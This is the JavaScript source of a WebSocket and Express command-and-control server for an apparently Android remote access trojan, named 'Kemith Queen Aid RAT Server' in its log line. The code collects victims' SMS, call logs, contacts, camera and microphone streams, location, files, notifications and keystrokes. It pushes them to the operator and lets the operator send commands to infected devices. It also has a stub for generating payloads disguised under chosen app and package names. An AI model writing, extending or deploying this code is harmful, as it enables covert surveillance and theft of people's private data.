const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Serve static files from public directory
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

// Store connected clients
const clients = new Map();

// WebSocket connection handling
wss.on('connection', (ws, req) => {
    const clientId = uuidv4();
    const clientInfo = {
        id: clientId,
        ws: ws,
        deviceInfo: null,
        connectedAt: new Date(),
        lastSeen: new Date()
    };

    clients.set(clientId, clientInfo);

    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data);
            handleClientMessage(clientId, msg);
        } catch (e) {
            handleBinaryData(clientId, data);
        }
    });

    ws.on('close', () => {
        clients.delete(clientId);
        broadcastToAdmins({ type: 'client_disconnected', clientId });
    });
});

function handleClientMessage(clientId, msg) {
    const client = clients.get(clientId);
    if (!client) return;

    client.lastSeen = new Date();

    switch(msg.type) {
        case 'device_info':
            client.deviceInfo = msg.data;
            broadcastToAdmins({ type: 'client_connected', clientId, deviceInfo: msg.data });
            break;
        case 'sms_list':
        case 'call_logs':
        case 'contacts':
        case 'camera_stream':
        case 'location':
        case 'files_list':
        case 'file_data':
        case 'mic_data':
        case 'notification':
        case 'keylog':
        case 'new_sms':
            broadcastToAdmins({ type: msg.type, clientId, data: msg.data });
            break;
    }
}

function handleBinaryData(clientId, data) {
    broadcastToAdmins({ type: 'binary_data', clientId, data: data.toString('base64') });
}

function broadcastToAdmins(msg) {
    wss.clients.forEach(ws => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify(msg));
        }
    });
}

// API Endpoints
app.get('/api/clients', (req, res) => {
    const clientList = Array.from(clients.values()).map(c => ({
        id: c.id,
        deviceInfo: c.deviceInfo,
        connectedAt: c.connectedAt,
        lastSeen: c.lastSeen
    }));
    res.json(clientList);
});

app.post('/api/command/:clientId', (req, res) => {
    const { clientId } = req.params;
    const { command, params } = req.body;
    const client = clients.get(clientId);

    if (client && client.ws.readyState === WebSocket.OPEN) {
        client.ws.send(JSON.stringify({ type: 'command', command, params }));
        res.json({ status: 'sent' });
    } else {
        res.status(404).json({ error: 'Client not connected' });
    }
});

// Generate payload endpoint
app.post('/api/generate-payload', (req, res) => {
    const { serverUrl, appName, packageName } = req.body;
    res.json({ status: 'generating', jobId: uuidv4() });
});

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'ok', clients: clients.size });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log('Kemith Queen Aid RAT Server running on port ' + PORT);
});
